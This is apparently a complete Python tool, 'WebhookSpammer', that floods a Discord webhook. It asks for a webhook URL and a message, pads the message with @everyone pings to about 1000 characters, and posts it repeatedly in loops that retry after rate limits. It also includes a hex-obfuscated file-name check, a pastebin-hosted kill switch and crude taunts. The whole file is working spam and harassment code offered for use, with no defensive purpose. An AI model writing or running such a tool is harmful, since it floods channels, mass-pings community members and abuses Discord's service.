import sys
import time
import requests
from colorama import Fore, init
import os
import asyncio

name = os.path.basename(__file__)


async def init():
    if name == 'WebhookSpammer.py' or name == "\x57\x65\x62\x68\x6f\x6f\x6b\x53\x70\x61\x6d\x6d\x65\x72\x2e\x70\x79" or name == "\x57\x65\x62\x68\x6f\x6f\x6b\x53\x70\x61\x6d\x6d\x65\x72\x2e\x65\x78\x65":
        pass
    else:
        sys.exit()


class AntiSkid:
    pass


asyncio.run(init())

checks = requests.get('https://pastebin.com/raw/hqxStELt').text

if checks != "LADXdToUlWAqYSXP0o7BURaiin43xv4xNQGyBJRaQAPusWb4pqxwKNNodQX4":
    print("[!] Deauthorized. Exiting...")
    time.sleep(5)
    print("Goodbye & fuck off :)")
    time.sleep(2)
    sys.exit()


def check_webhook(webhook):
    try:
        with requests.get(webhook) as r:
            if r.status_code == 200:
                return True
            else:
                return False
    except:
        return False


def inflate_message(message):
    message = f"@everyone - {message}\n"
    message = message * (999 // len(message) + 1)
    return message


def spam_threads(webhook, message, iterations):
    def spam(webhook, message):
        r = requests.post(
            webhook,
            json={"content": message}
        )

        if r.status_code == 204:
            print(f"{Fore.GREEN}Status: OK \n{Fore.RESET}")

        elif r.status_code == 429:
            print(f"{Fore.RED}  Oops! Rate Limited.. Trying again in 5 seconds... \n{Fore.RESET}")
            return 429

        else:
            print(f"{Fore.YELLOW}{r.status_code}\n{Fore.RESET}")
            str(input(f"{Fore.YELLOW}Press anything to exit..."))
            sys.exit()

    for x in range(iterations):
        for y in range(5):
            if spam(webhook, message) == 429:
                time.sleep(5)


class WebhookSpam:
    def __init__(self):
        print("Made with shitty code from New Zealand \n")
        self.choice = int(input(f"{Fore.YELLOW}To continue, press 9  {Fore.RESET} >>> "))

        if self.choice not in [9]:
            print(f"{Fore.RED}Invalid Choice! Exiting...\n")
            time.sleep(2)
            sys.exit()

        if self.choice == 9:
            self.webhook = str(input(f"{Fore.YELLOW}Enter Discord Webhook Address {Fore.RESET} >>> "))

            if not check_webhook(self.webhook):
                print(f"{Fore.RED}The Supplied Webhook is no longer valid!{Fore.RESET}")
                time.sleep(2)
                sys.exit()

            self.message = str(input(f"{Fore.YELLOW}Enter Your Message: {Fore.RESET} >>> "))
            self.iterations = int(input(f"{Fore.YELLOW}Enter Number of Iterations: {Fore.RESET} >>> "))
            if self.iterations < 0:
                print(f"{Fore.RED}Invalid Input{Fore.RESET}")
                time.sleep(2)
                sys.exit()

            spam_threads(self.webhook, inflate_message(self.message), self.iterations)


if __name__ == "__main__":

    if os.name == "nt":
        os.system("cls")
    else:
        print("How did you plan on running an exe on a non windows system?????")
        sys.exit()

    try:
        WebhookSpam()
    except KeyboardInterrupt:
        input(f"\n\n{Fore.YELLOW}Keyboard Interrupt: Exiting...{Fore.RESET}")
    except Exception as e:
        input(f"\n\n{Fore.RED}Error: {e}{Fore.RESET}")
